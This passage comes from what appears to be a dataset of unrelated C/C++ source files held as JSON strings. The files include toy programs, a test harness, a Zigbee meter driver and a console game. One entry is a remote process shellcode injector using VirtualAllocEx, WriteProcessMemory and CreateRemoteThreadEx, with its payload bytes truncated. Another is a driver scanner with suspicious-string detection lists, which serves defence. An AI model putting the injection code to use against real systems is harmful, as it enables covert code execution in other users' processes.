\uc751\uc6a9 \ud504\ub85c\uadf8\ub7a8\uc758 \uba54\uc2dc\uc9c0 \ud38c\ud504\ub97c \uc2dc\uc791\ud558\uc9c0 \uc54a\uace0 \uc751\uc6a9 \ud504\ub85c\uadf8\ub7a8\uc744 \ub05d\ub0bc \uc218 \uc788\ub3c4\ub85d FALSE\ub97c\n\t// \ubc18\ud658\ud569\ub2c8\ub2e4.\n\treturn FALSE;\n}\n\n",
    "class Solution {\npublic:\n    string intToRoman(int num) {\n        string s = \"\";\n        while(num != 0){\n            if(num >= 1000){\n                s += 'M';\n                num -= 1000;\n            } else if (num >= 900){\n                s += \"CM\";\n                num -= 900;\n            } else if (num >= 500){\n                s += 'D';\n                num -= 500;\n            } else if (num >= 400){\n                s += \"CD\";\n                num -= 400;\n            } else if (num >= 100){\n                s += 'C';\n                num -= 100;\n            } else if (num >= 90){\n                s += \"XC\";\n                num -= 90;\n            } else if (num >= 50){\n                s += 'L';\n                num -= 50;\n            } else if (num >= 40){\n                s += \"XL\";\n                num -= 40;\n            } else if (num >= 10){\n                s += 'X';\n                num -= 10;\n            } else if (num >= 9){\n                s += \"IX\";\n                num -= 9;\n            } else if (num >= 5){\n                s += 'V';\n                num -= 5;\n            } else if (num >= 4){\n                s += \"IV\";\n                num -= 4;\n            } else if (num >= 1){\n                s += 'I';\n                num -= 1;\n            } else {\n                break;\n            }\n        }\n        return s;\n    }\n};\n",
    "#include <Windows.h>\n#include <iostream>\n#include <string>\n#include <iomanip>\n#pragma comment(lib, \"ntdll.lib\")\n\nusing namespace std;\n\ntypedef LONG(NTAPI* pfnZwUnmapViewOfSection)(HANDLE, PVOID);\n\nvoid LogHex(const string& message, PVOID value) {\n    cout << \"[+] \" << message << \" : 0x\" << hex << uppercase << (uintptr_t)value << nouppercase << dec << endl;\n}\n\nint main() {\n    string pidInput;\n    DWORD targetPid;\n\n    cout << \"Enter the PID of the target process: \";\n    getline(cin, pidInput);\n    targetPid = stoi(pidInput);\n\n    HANDLE hProcess = NULL;\n    LPVOID remoteBuffer = NULL;\n    unsigned char shellcode[] =\n        \"\\x48\\x83\\xEC\\x28\\x48\\x83\\xE4\\xF0\\x48\\x8D\\x15\\x66\\x00\\x00\\x00\"\n        // rest of shellcode \n        \"\\xE9\\x14\\xFF\\xFF\\xFF\\x48\\x03\\xC3\\x48\\x83\\xC4\\x28\\xC3\";\n\n    if (targetPid == 0) {\n        cerr << \"[!] Invalid PID input.\" << endl;\n        return 1;\n    }\n\n    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);\n    if (hProcess == NULL) {\n        cerr << \"[!] Couldn't get a handle to the process (PID: \" << targetPid << \"). Error: \" << GetLastError() << endl;\n        return 1;\n    }\n\n    remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    if (remoteBuffer == NULL) {\n        cerr << \"[!] Couldn't allocate buffer in the target process. Error: \" << GetLastError() << endl;\n        CloseHandle(hProcess);\n        return 1;\n    }\n\n    LogHex(\"Allocated buffer\", remoteBuffer);\n\n    if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, sizeof(shellcode), NULL)) {\n        cerr << \"[!] Failed to write shellcode into the target process. Error: \" << GetLastError() << endl;\n        CloseHandle(hProcess);\n        return 1;\n    }\n\n    cout << \"[+] Shellcode written to process memory.\" << endl;\n\n    DWORD threadId;\n    HANDLE hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, 0, &threadId);\n    if (hThread == NULL) {\n        cerr << \"[!] Couldn't create remote thread. Error: \" << GetLastError() << endl;\n        CloseHandle(hProcess);\n        return 1;\n    }\n\n    LogHex(\"Created remote thread\", (PVOID)threadId);\n    cout << \"[+] Thread execution started.\" << endl;\n\n    CloseHandle(hProcess);\n    CloseHandle(hThread);\n\n    cout << \"[+] Process completed successfully!\" << endl;\n\n    return 0;\n}\n",
    "#include <windows.h>\n#include <filesystem>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <chrono>\n#include <iostream>\n\nconstexpr int TIME_LIMIT = 500; // milliseconds\nconstexpr std::string solution_exe = \"Main.exe\";\n\n\nnamespace fs = std::filesystem;\n\nvoid clear_folders() {\n    const std::string path = fs::current_path().parent_path().string() + \"\\\\StressTesting\\\\Tests\";\n    for (const auto &entry: fs::directory_iterator(path)) {\n        remove_all(entry);\n    }\n}\n\nstd::string launch_program(const std::string &exe_path, const std::vector<std::string> &args) {\n    std::string commandLine = \"\\\"\" + exe_path + \"\\\"\";\n    for (const auto &arg: args) {\n        commandLine += \" \" + arg;\n    }\n    STARTUPINFO si;\n    PROCESS_INFORMATION pi;\n    ZeroMemory(&si, sizeof(si));\n    ZeroMemory(&pi, sizeof(pi));\n    si.cb = sizeof(si);\n    if (!CreateProcess(\n        exe_path.c_str(),\n        const_cast<char *>(commandLine.c_str()),\n        nullptr,\n        nullptr,\n        FALSE,\n        0,\n        nullptr,\n        nullptr,\n        &si,\n        &pi\n    )) {\n        std::cerr << \"CreateProcess failed with the exit code: \" << GetLastError() << std::endl;\n        std::cerr << \"Unsuccessful file is: \" << exe_path << std::endl;\n        exit(-1);\n    }\n\n    DWORD waitResult = WaitForSingleObject(pi.hProcess, TIME_LIMIT);\n    if (waitResult == WAIT_TIMEOUT) {\n        TerminateProcess(pi.hProcess, 0);\n        return \"TL\";\n    }\n\n    DWORD exitCode;\n    GetExitCodeProcess(pi.hProcess, &exitCode);\n    if (exitCode) {\n        return \"RE\";\n    }\n\n    CloseHandle(pi.hProcess);\n    CloseHandle(pi.hThread);\n    return \"OK\";\n}\n\nstd::string create_test(const int &test) {\n    const std::string test_folder = fs::current_path().parent_path().string() + R\"(\\StressTesting\\Tests\\Test_)\" +\n                                    std::to_string(test);\n    fs::create_directory(test_folder);\n    fs::create_directory(test_folder + \"\\\\Output\");\n\n    const std::string input_path = test_folder + \"\\\\Input.txt\";\n    const std::string tsol_output_path = test_folder + \"\\\\Output\\\\TestingSolution.txt\";\n    const std::string rsol_output_path = test_folder + \"\\\\Output\\\\RightSolution.txt\";\n    const std::string report_path = test_folder + \"\\\\Report.txt\";\n\n    std::chrono::time_point<std::chrono::high_resolution_clock> tsol_begin, tsol_end; {\n        // Generator launch\n        std::ofstream input(input_path);\n        const std::string generator_exe_path = fs::current_path().string() + \"\\\\Generator.exe\";\n        const std::string verdict = launch_program(generator_exe_path, {input_path});\n        if (verdict != \"OK\") {\n            std::cerr << \"Generator launch failed!\";\n            exit(-1);\n        }\n    } {\n        // Testing solution launch\n        std::ofstream tsol_output(tsol_output_path);\n        const std::string tsol_exe_path = fs::current_path().string() + \"\\\\\" + solution_exe;\n        tsol_begin = std::chrono::high_resolution_clock::now();\n        const std::string verdict = launch_program(tsol_exe_path, {input_path, tsol_output_path});\n        tsol_end = std::chrono::high_resolution_clock::now();\n        if (verdict != \"OK\") { return verdict; }\n    } {\n        // Right solution launch\n        std::ofstream rsol_output(rsol_output_path);\n        const std::string rsol_exe_path = fs::current_path().string() + \"\\\\Solution.exe\";\n        const std::string verdict = launch_program(rsol_exe_path, {input_path, rsol_output_path});\n        if (verdict != \"OK\") {\n            std::cerr << \"Right Solution launch failed with the exit code: \" << verdict << std::endl;\n            exit(-1);\n        }\n    } {\n        // Checker launch\n        std::ofstream report(report_path);\n        const std::string checker_exe_path = fs::current_path().string() + \"\\\\Checker.exe\";\n        const std::string verdict = launch_program(checker_exe_path, {\n                                                       input_path,\n                                                       report_path,\n                                                       tsol_output_path,\n                                                       rsol_output_path\n                                                   });\n        if (verdict == \"RE\") {\n            return \"WA\";\n        }\n        if (verdict != \"OK\") {\n            std::cerr << \"Report launch failed!\";\n            exit(-1);\n        } {\n            // Writing executable time\n            std::chrono::duration<double, std::milli> executable_time = tsol_end - tsol_begin;\n            std::ofstream out(report_path, std::ios::app);\n            out << std::fixed << std::setprecision(3);\n            out << \"Executable time: \" << executable_time.count() / 1000 << \" sec\\n\";\n        }\n        return \"OK\";\n    }\n}\n\nvoid print_from_file(const std::string &filepath) {\n    std::string line;\n    std::ifstream file(filepath);\n    while (std::getline(file, line)) {\n        std::cout << line << std::endl;\n    }\n    file.close();\n}\n\nvoid print_test_info(const int &test",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <set>\n#include <map>\n#include <tuple>\n#include <algorithm>\n\nstruct Antenna { char frequency; int x; int y; };\nstruct XY { int x; int y; };\n\nbool operator<(const XY&, const XY&);\nbool operator<(const Antenna&, const Antenna&);\n\nvoid day8_part2();\nbool read_data(const std::string&, std::vector<Antenna>&, XY&);\nstd::map<char, int> get_uniq_freq(const std::vector<Antenna>&);\nvoid add_antinode(int, int, int, int, const XY&, std::set<XY>&);\nstd::set<XY> find_antinodes(const std::vector<Antenna>&, const XY&, const std::map<char, int>&);\n\n\nint main() {\n    day8_part2();\n    return 0;\n}\n\n\nvoid day8_part2() {\n    std::vector<Antenna> input_data;\n    XY map_size;\n    if (read_data(\"input.txt\", input_data, map_size)) {\n        std::sort(input_data.begin(), input_data.end()); // sort by frequency\n        std::map<char, int> freq_index {get_uniq_freq(input_data)};\n        std::set<XY> antinodes {find_antinodes(input_data, map_size, freq_index)};\n        std::cout<< \"Result: \" << antinodes.size();\n    }\n}\n\nbool operator<(const XY& p1, const XY& p2) {\n    return std::tie(p1.x, p1.y) < std::tie(p2.x, p2.y);\n}\n\nbool operator<(const Antenna& p1, const Antenna& p2) {\n    return p1.frequency < p2.frequency;\n}\n\nbool read_data(const std::string& f_name, std::vector<Antenna>& input_data, XY& map_size) {\n    std::ifstream file(f_name);\n    if(!file) {\n        std::cout << \"File <\" << f_name << \"> not found\\n\";\n        return false;\n    }\n    std::string temp_str;\n    int x {0};\n    while (getline(file, temp_str)) {\n        for (std::size_t i=0; i!=temp_str.size(); ++i) {\n            if (temp_str[i] != '.') {\n                const int y = i;\n                input_data.push_back({temp_str[y], x, y});\n            }\n        }\n        ++x; // count lines\n    }\n    map_size.x = {x};\n    map_size.y = temp_str.size();\n    return true;\n}\n\n/*\nFor every unique frequency, get the position of the 1st antenna inside of the input_data vector.\nSince the vector is sorted by frequency, while searching antinodes, go through the vector only once.\n*/\nstd::map<char, int> get_uniq_freq(const std::vector<Antenna>& input_data) {\n    std::map<char, int> freq_index;\n    for (std::size_t i=0; i!=input_data.size(); ++i) {\n        freq_index.insert({input_data[i].frequency, i});\n    }\n    return freq_index;\n}\n\nvoid add_antinode(int x, int y, int dx, int dy, const XY& map_size, std::set<XY>& antinodes) {\n    if (x >= 0 && x < map_size.x && y >= 0 && y < map_size.y) {\n        antinodes.insert({x, y});\n        add_antinode(x+dx, y+dy, dx, dy, map_size, antinodes);\n    }\n}\n\nstd::set<XY> find_antinodes(const std::vector<Antenna>& input_data, const XY& map_size, const std::map<char, int>& freq_index) {\n    std::set<XY> antinodes;\n    for (const auto& f_id : freq_index) { // for every unique frequency\n        std::size_t i = f_id.second;\n        while (input_data[i].frequency == f_id.first) {\n            std::size_t j {1};\n            while (input_data[i+j].frequency == f_id.first) {\n                const int dx {input_data[i].x - input_data[i+j].x}; // change in x\n                const int dy {input_data[i].y - input_data[i+j].y}; // change in y\n                // add if within the bounds of the map\n                add_antinode(input_data[i+j].x, input_data[i+j].y, dx, dy, map_size, antinodes);\n                add_antinode(input_data[i].x, input_data[i].y, -dx, -dy, map_size, antinodes);\n                ++j;\n            }\n            ++i;\n        }\n    }\n    return antinodes;\n}\n",
    "#include \"driver_scanner.hpp\"\n#include <sstream>\n#include <iomanip>\n#include <algorithm>\n#include <cctype>\n#include <locale>\n#include <winhttp.h>\n#include <wincrypt.h>\n#include <fstream>\n#include <softpub.h>\n#include <wintrust.h>\n#include <mscat.h>\n\n#pragma comment(lib, \"winhttp.lib\")\n#pragma comment(lib, \"crypt32.lib\")\n#pragma comment(lib, \"wintrust.lib\")\n#pragma comment(lib, \"advapi32.lib\")\n\n// Define MD5 length constant\n#define MD5_HASH_LENGTH 16\n\n// Helper function to convert LPSTR to wstring\nstd::wstring string_to_wstring(const std::string& str) {\n    if (str.empty()) return std::wstring();\n    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);\n    std::wstring wstr(size_needed, 0);\n    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstr[0], size_needed);\n    return wstr;\n}\n\n// Helper function to convert FILETIME to time_point\nstd::chrono::system_clock::time_point FileTimeToTimePoint(const FILETIME& ft) {\n    ULARGE_INTEGER ull;\n    ull.LowPart = ft.dwLowDateTime;\n    ull.HighPart = ft.dwHighDateTime;\n\n    // Convert to Unix epoch\n    auto fileTime_systemTime = ull.QuadPart;\n    auto unixTime = (fileTime_systemTime - 116444736000000000ULL) / 10000000ULL;\n\n    return std::chrono::system_clock::from_time_t(static_cast<time_t>(unixTime));\n}\n\nDriverScanner::DriverScanner()\n    : deepScanEnabled(false)\n    , signatureVerificationEnabled(false)\n{\n    fetchMsdbxList();\n}\n\nDriverScanner::~DriverScanner() {\n}\n\nvoid DriverScanner::enableDeepScan(bool enable) {\n    deepScanEnabled = enable;\n}\n\nvoid DriverScanner::setSignatureVerification(bool enable) {\n    signatureVerificationEnabled = enable;\n}\n\nvoid DriverScanner::setCustomScanPath(const std::wstring& path) {\n    customScanPath = path;\n}\n\nvoid DriverScanner::checkDriverCapabilities(DriverInfo& driver) {\n    std::ifstream file(driver.path, std::ios::binary);\n    if (!file) return;\n\n    // Read the entire file content\n    std::vector<BYTE> content(\n        (std::istreambuf_iterator<char>(file)),\n        std::istreambuf_iterator<char>()\n    );\n    file.close();\n\n    driver.hasReadWriteCapability = checkForReadWriteCapability(content);\n    driver.hasKillProcessCapability = checkForKillProcessCapability(content);\n\n    if (deepScanEnabled) {\n        driver.hasRegistryCapability = checkForRegistryCapability(content);\n        driver.hasFileSystemCapability = checkForFileSystemCapability(content);\n        driver.hasNetworkCapability = checkForNetworkCapability(content);\n        analyzeDriverStrings(driver, content);\n        checkVulnerabilities(driver, content);\n    }\n\n    if (signatureVerificationEnabled) {\n        verifyDigitalSignature(driver.path, driver);\n    }\n\n    getFileMetadata(driver.path, driver);\n}\n\nbool DriverScanner::checkForRegistryCapability(const std::vector<BYTE>& driverContent) {\n    const std::vector<std::string> registryPatterns = {\n        \"ZwCreateKey\",\n        \"ZwOpenKey\",\n        \"ZwDeleteKey\",\n        \"ZwQueryKey\",\n        \"ZwSetValueKey\",\n        \"ZwQueryValueKey\"\n    };\n\n    std::string content(driverContent.begin(), driverContent.end());\n    for (const auto& pattern : registryPatterns) {\n        if (content.find(pattern) != std::string::npos) {\n            return true;\n        }\n    }\n    return false;\n}\n\nbool DriverScanner::checkForFileSystemCapability(const std::vector<BYTE>& driverContent) {\n    const std::vector<std::string> fsPatterns = {\n        \"ZwCreateFile\",\n        \"ZwOpenFile\",\n        \"ZwDeleteFile\",\n        \"ZwReadFile\",\n        \"ZwWriteFile\",\n        \"FltRegisterFilter\"\n    };\n\n    std::string content(driverContent.begin(), driverContent.end());\n    for (const auto& pattern : fsPatterns) {\n        if (content.find(pattern) != std::string::npos) {\n            return true;\n        }\n    }\n    return false;\n}\n\nbool DriverScanner::checkForNetworkCapability(const std::vector<BYTE>& driverContent) {\n    const std::vector<std::string> networkPatterns = {\n        \"TdiOpen\",\n        \"TdiClose\",\n        \"TdiSend\",\n        \"TdiReceive\",\n        \"WSKStartup\",\n        \"FwpsCalloutRegister\"\n    };\n\n    std::string content(driverContent.begin(), driverContent.end());\n    for (const auto& pattern : networkPatterns) {\n        if (content.find(pattern) != std::string::npos) {\n            return true;\n        }\n    }\n    return false;\n}\n\nvoid DriverScanner::analyzeDriverStrings(DriverInfo& driver, const std::vector<BYTE>& content) {\n    // Convert content to string for analysis\n    std::string str(content.begin(), content.end());\n\n    // Look for suspicious strings\n    const std::vector<std::string> suspiciousPatterns = {\n        \"hack\", \"cheat\", \"inject\", \"hook\", \"patch\",\n        \"bypass\", \"escalate\", \"privilege\", \"rootkit\",\n        \"debug\", \"anti\", \"detect\"\n    };\n\n    for (const auto& pattern : suspiciousPatterns) {\n        if (str.find(pattern) != std::string::npos) {\n            driver.suspiciousStrings.push_back(pattern);\n        }\n    }\n}\n\nvoid DriverScanner::checkVulnerabilities(DriverInfo& ",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\nusing namespace std;\r\n\r\nint main() {\r\n     \r\n     fstream fout;\r\n\tfout.open(\"a.cpp\");\r\n\tif (!fout.is_open()){\r\n\t\tcout << \"Error0\";\r\n}\r\n\telse {\r\n\t\tfout << \"#include <iostream>\\n#include <fstream>\\n#include <string>\\nusing namespace std;\\nint main(){\";\r\n}\r\n     string iy;\r\n     cin >> iy;\r\n    ifstream inputFile(iy);  // \u041e\u0442\u043a\u0440\u044b\u0442\u0438\u0435 \u0444\u0430\u0439\u043b\u0430 \u0434\u043b\u044f \u0447\u0442\u0435\u043d\u0438\u044f\r\n    if (!inputFile) {\r\n        cerr << ' ' << endl;\r\n        return 1;  // \u0417\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b \u0441 \u043e\u0448\u0438\u0431\u043a\u043e\u0439\r\n    }\r\n\r\n    string line;\r\n    while (getline(inputFile, line)) {  // \u0427\u0442\u0435\u043d\u0438\u0435 \u0444\u0430\u0439\u043b\u0430 \u043f\u043e\u0441\u0442\u0440\u043e\u0447\u043d\u043e\r\n        \r\n        \r\n        string input = line;\r\n        if (input.substr(0, 1)==\"s\"){\r\n        std::cout << line.size();}\r\n\r\n        \r\n             if (line.substr(0,1) == \"+\"){\r\n                 cout << \"+\"; \r\n}\r\n        if (line.substr(0,2) == \"pi\"){\r\n                 cout << 3.14; \r\n}\r\nif (line.substr(0,3) == \"tea\"){\r\n                 cout << \"kettle tea secret version \u00a0  \u00a0\"; \r\n}\r\nif (line.substr(0,3) == \"int\"){\r\n    string otp = input.substr(0, input.size());\r\n    /*\r\n                 string otp;\r\n                 int yut = 0;\r\n                 string opp;\r\n                for (int ttyttt = 4; input[ttyttt] < '=';){\r\n\t\totp = otp + input[ttyttt];\r\n                                   yut = ttyttt;\r\n\t\tttyttt++;\r\n}\r\n                  // for (int ttyttot = yut; input[ttyttot] < ';';){\r\n\t\topp = input.substr(yut, input.size());\r\n                                   \r\n\t\t// ttyttot++;\r\n\r\n}*/\r\nif (!fout.is_open()){\r\n\t\tcout << \"Error1\";\r\n}\r\n\telse {\r\n\t\tfout << \"\\n\" << otp << \"\\n\" ;\r\n}\r\n                 \r\n}\r\nif (line.substr(0,3) == \"cat\"){\r\n                 cout << \"cat\"; \r\n}\r\n        \r\n        else if (line.size() >= 5) {\r\n            if (line.substr(0, 5) == \"print\") {  // \u041f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u043c, \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u0442\u0441\u044f \u043b\u0438 \u0441\u0442\u0440\u043e\u043a\u0430 \u0441 \"print\"\r\n\tstring op;\r\n                for (int ttytt = 6; ttytt < input.size();){\r\n\t\top = op + input[ttytt];\r\n\t\tttytt++;\r\n}\r\n\t\tif (!fout.is_open()){\r\n\t\tcout << \"Error2\";\r\n}\r\n\telse {\r\n\t\tfout << \"\\n cout << \"  << op <<\"<< endl; \\n\";\r\n}\r\n            }\r\n        \r\n\r\n        \r\n         \r\n    \r\n    \r\n    inputFile.close();  // \u0417\u0430\u043a\u0440\u044b\u0442\u0438\u0435 \u0444\u0430\u0439\u043b\u0430\r\n     if (!fout.is_open()){\r\n\t\tcout << \"Error99\";\r\n}\r\n\telse {\r\n\t\tfout << \"\\n return 0; \\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n }\";\r\n}\r\n    fout.close();\r\n    return 0;\r\n        }}}\r\n",
    "#include \"z2s_device_electricity_meter.h\"\r\n\r\nvoid initZ2SDeviceElectricityMeter(ZigbeeGateway *gateway, zb_device_params_t *device, bool active_query, uint8_t Supla_channel) {\r\n  \r\n  auto Supla_Z2S_OnePhaseElectricityMeter = new Supla::Sensor::Z2S_OnePhaseElectricityMeter(gateway, device, active_query);\r\n  Supla_Z2S_OnePhaseElectricityMeter->getChannel()->setChannelNumber(Supla_channel);\r\n}\r\n\r\nvoid addZ2SDeviceElectricityMeter(ZigbeeGateway *gateway, zb_device_params_t *device, bool active_query, uint8_t free_slot, uint8_t next_free_slot) {\r\n  \r\n  auto Supla_Z2S_VirtualRelay = new Supla::Control::Z2S_VirtualRelay(gateway,device->ieee_addr);\r\n  Z2S_fillDevicesTableSlot(device, free_slot, Supla_Z2S_VirtualRelay->getChannelNumber(), SUPLA_CHANNELTYPE_RELAY,-1);\r\n  auto Supla_Z2S_OnePhaseElectricityMeter = new Supla::Sensor::Z2S_OnePhaseElectricityMeter(gateway, device);\r\n  Z2S_fillDevicesTableSlot(device, next_free_slot, Supla_Z2S_OnePhaseElectricityMeter->getChannelNumber(), SUPLA_CHANNELTYPE_ELECTRICITY_METER, -1);\r\n\r\n}\r\n\r\nvoid msgZ2SDeviceElectricityMeter(uint8_t Supla_channel, uint8_t selector, uint64_t value) {\r\n\r\n  auto element = Supla::Element::getElementByChannelNumber(Supla_channel);\r\n  if (element != nullptr && element->getChannel()->getChannelType() == SUPLA_CHANNELTYPE_ELECTRICITY_METER) {\r\n        auto Supla_OnePhaseElectricityMeter = reinterpret_cast<Supla::Sensor::Z2S_OnePhaseElectricityMeter *>(element);\r\n        switch (selector) {\r\n          case Z2S_EM_VOLTAGE_SEL: Supla_OnePhaseElectricityMeter->setVoltage(0, value * 100); break;\r\n          case Z2S_EM_CURRENT_SEL: Supla_OnePhaseElectricityMeter->setCurrent(0, value * 1); break;\r\n          case Z2S_EM_ACTIVE_POWER_SEL: Supla_OnePhaseElectricityMeter->setPowerActive(0, value * 100000); break;\r\n          case Z2S_ACT_FWD_ENERGY_SEL: Supla_OnePhaseElectricityMeter->setFwdActEnergy(0, value * 1000); break;\r\n        }\r\n        \r\n    }\r\n}\r\n",
    "#include<iostream>\n#include<conio.h>\n#include<windows.h>\nusing namespace std;\nchar map[21][21];\nint enemyX[3]={5,11,15};\nint enemyY[3]={5,11,15};\nint enemyDir[3]={1,-1,1};\nvoid ShowMenu(){\ncout<<\"1. Start Game\"<<endl;\ncout<<\"2. load Game\"<<endl;\ncout<<\"3. Difficulty\"<<endl;\ncout<<\"4. Help\"<<endl;\ncout<<\"5. Exit\"<<endl;\n}\nint brickBlocks[][2] = {\n    {1, 2}, {1, 8}, {1, 19}, {1, 18}, {1, 17}, {2, 3}, {2, 7}, {2, 11},\n    {3, 1}, {3, 5}, {3, 8}, {3, 18}, {4, 11}, {4, 19}, {5, 2}, {5, 3},\n    {5, 6}, {5, 9}, {5, 11}, {5, 12}, {5, 13}, {5, 16}, {5, 18}, {6, 5},\n    {6, 1}, {7, 1}, {7, 13}, {8, 1}, {8, 5}, {8, 13}, {8, 19}, {9, 1},\n    {9, 9}, {9, 16}, {10, 1}, {10, 5}, {10, 7}, {10, 9}, {10, 19},\n    {11, 6}, {11, 7}, {11, 12}, {11, 13}, {11, 15}, {11, 16}, {11, 19},\n    {12, 3}, {12, 7}, {12, 13}, {12, 17}, {13, 9}, {13, 10}, {13, 14},\n    {13, 15}, {13, 18}, {14, 1}, {14, 5}, {14, 11}, {15, 3}, {15, 7},\n    {15, 11}, {15, 12}, {15, 13}, {15, 19}, {16, 3}, {16, 11}, {16, 17},\n    {17, 5}, {17, 6}, {17, 14}, {17, 15}, {17, 18}, {18, 1}, {18, 13},\n    {18, 17}, {18, 19}, {19, 1}, {19, 2}, {19, 6}, {19, 7}, {19, 12},\n    {19, 13}, {19, 17}, {19, 18}\n};\nvoid initializeMap(){\nfor(int i=0 ; i<21; i++){\n    for(int j=0 ; j<21;j++){\n        if(i==0 ||i==20||j==0||j==20){map[i][j]='*';}\n        else if(i%2==0 && j%2==0){map[i][j]='X';}\n        else{map[i][j]=' ';}\n    }}\n    int numBricks = sizeof(brickBlocks) / sizeof(brickBlocks[0]);\n    for (int k = 0; k < numBricks; k++) {\n        int x = brickBlocks[k][0];\n        int y = brickBlocks[k][1];\n        map[x][y] = 'N';  // \u0628\u0644\u0648\u06a9 \u0622\u062c\u0631\u06cc\n    }\n}\nvoid drawMap(int playerX, int playerY){\nfor (int i=0 ;i<21 ;i++){\n    for(int j=0;j<21;j++){\n        if(i==playerX&&j==playerY){cout<<\"s \";}\n            else if ((i==enemyX[0]&& j==enemyY[0])||\n                    (i==enemyX[1] && j==enemyY[1]||\n                    (i==enemyX[2] && j==enemyY[2]) ))\n                    {cout<<\"E \";}\n            else if(map[i][j]=='X'){cout<<\"XX\";}\n        else if (map[i][j]=='N'){cout<<\"N \";}\n        else if (map[i][j]=='*'){cout<<\"* \";}\n        else{cout<<\"  \";}\n    }\n    cout<<endl;\n}\n}\nbool isWalkable(int x,int y){\nreturn(map[x][y]==' ');\n}\n\n    void updateEnemies(){\n    for(int i=0 ;i<3 ;i++){\n          if (enemyDir[i] == 1 && isWalkable(enemyX[i], enemyY[i] + 1)) {enemyY[i]++;}\n        else if (enemyDir[i] == -1 && isWalkable(enemyX[i], enemyY[i] - 1)) {enemyY[i]--;}\n             else {enemyDir[i] *= -1; }\n    }}\n\nvoid movePlayer() {\n    int playerX = 1, playerY = 1;\n    char input;\n\n    while (true) {\n        system(\"cls\");\n        drawMap(playerX,playerY);\n        if (_kbhit()) {\n        input = _getch();\n        if (input == 'w' && isWalkable(playerX-1,playerY)) playerX--;\n        else if (input == 's' && isWalkable(playerX+1,playerY)) playerX++;\n        else if (input == 'a' && isWalkable(playerX,playerY-1)) playerY--;\n        else if (input == 'd' && isWalkable(playerX,playerY+1)) playerY++;\n        else if (input == 'e') {\n             if (map[playerX - 1][playerY] == 'N') map[playerX - 1][playerY] = ' ';\n        else if (map[playerX + 1][playerY] == 'N') map[playerX + 1][playerY] = ' ';\n        else if (map[playerX][playerY - 1] == 'N') map[playerX][playerY - 1] = ' ';\n        else if (map[playerX][playerY + 1] == 'N') map[playerX][playerY + 1] = ' ';\n            }\n            else if (input == 'k') { for (int i = 0; i < 3; i++) {\n                    if ((enemyX[i] == playerX - 1 && enemyY[i] == playerY) ||\n                        (enemyX[i] == playerX + 1 && enemyY[i] == playerY) ||\n                        (enemyX[i] == playerX && enemyY[i] == playerY - 1) ||\n                        (enemyX[i] == playerX && enemyY[i] == playerY + 1)) {\n                        enemyX[i] = -1;\n                        enemyY[i] = -1;\n                        cout << \"Enemy killed!\" << endl;\n                        break;\n                    }\n                }\n            }\n        else if (input == 'q') break;\n        }\n        updateEnemies();\n        Sleep(200);\n}\n}\nint main(){\ninitializeMap();\nint choice;\nwhile(true){\n system(\"cls\");\nShowMenu();\n cout<<\"Enter your choice: \";\n cin>>choice;\n if(choice==1){\n    movePlayer();\n }\n else if(choice==5){\n    cout<<\"Exiting..\"<<endl;\n    break;\n }\n else{\n    cout<<\"Invalid option!\"<<endl;\n }\n system(\"pause\");\n}\nreturn 0;\n}\n",
    "#include <iostream>\n#include <io.h>\n\nusing namespace std;\n\nchar address[100];\nchar search1[100], name[100];\nstring bookmarkname[100], bookmarkaddress[100]; // BookMark\uc5d0\uc11c \uc774\ub984, \uc8fc\uc18c \uc800\uc7a5\uc744 \uc704\ud574 \uc0ac\uc6a9\ud560 \ubc30\uc5f4.\n\nstring files[20000];                  //\ud30c\uc77c \ubaa9\ub85d \uc800\uc7a5 \uc7a5\uc18c\nstring directorys[100][1000];             //\ud3f4\ub354 \ubaa9\ub85d \uc800\uc7a5 \uc7a5\uc18c\n\n\nstruct _finddata_t fd;\n\n\n\nint i = 0;                           //\ud0d0\uc0c9\ub41c \ud30c\uc77c \uc218\nint k = 0; int kk = 0;           //\ud0d0\uc0c9\ub41c \ud3f4\ub354 \uc218  \nint returnk[1000] = { 0, };               //k \uc800\uc7a5\uc744 \uc704\ud55c \ubc30\uc5f4.\n\n\n\nvoid FileFinder();\nvoid FileFinder(char address[]); // \uae30\uc874\uc5d0 \uc788\ub358 FileFinder \uc624\ubc84\ub85c\ub529.\nvoid getFileExtension2(string& filename);\nvoid fileName();\nvoid FileSearch(char search1[]);\nint isFileOrDir();\nvoid FileExplorer(char file_path[]);\n\nvoid FileExplorer2(char file_path[])       //\ub0b4\uc6a9\uc740 \uae30\uc874\uc5d0 \uc788\ub294 FileExplorer\ub791 \ub611\uac19\uc740\ub370, \n{                                          //if (check == 0 && fd.name[0] != '.')  \uc5ec\uae30\uc11c \uc7ac\uadc0\ud568\uc218 \uc81c\uc678\ud558\uace0  \n                                           // directorys[k++] = file_pt; \ucd94\uac00\ud568. -> \ud3f4\ub354 \uc774\ub984 \uc800\uc7a5\ud558\ub294 \ubcc0\uc218.\n    intptr_t handle;\n    int check = 0;\n    char file_path2[_MAX_PATH];\n\n    strcat(file_path, \"\\\\\");\n    strcpy(file_path2, file_path);\n    strcat(file_path, \"*\");\n\n    if ((handle = _findfirst(file_path, &fd)) == -1)\n    {\n        printf(\"No such file or directory\\n\");\n        return;\n    }\n\n    while (_findnext(handle, &fd) == 0)\n    {\n        char file_pt[_MAX_PATH];\n        strcpy(file_pt, file_path2);         //file_pt \uc5d0 file_path2(\uc6d0\ub798 \uc8fc\uc18c) \ubcf5\uc0ac\n        strcat(file_pt, fd.name);            //file_pt \ub4a4\uc5d0 fd.name(\ud30c\uc77c \uc81c\ubaa9?) \ubd99\uc5ec\ub77c\n\n        check = isFileOrDir();                         //\ud30c\uc77c\uc778\uc9c0 \ub514\ub809\ud1a0\ub9ac \uc778\uc9c0 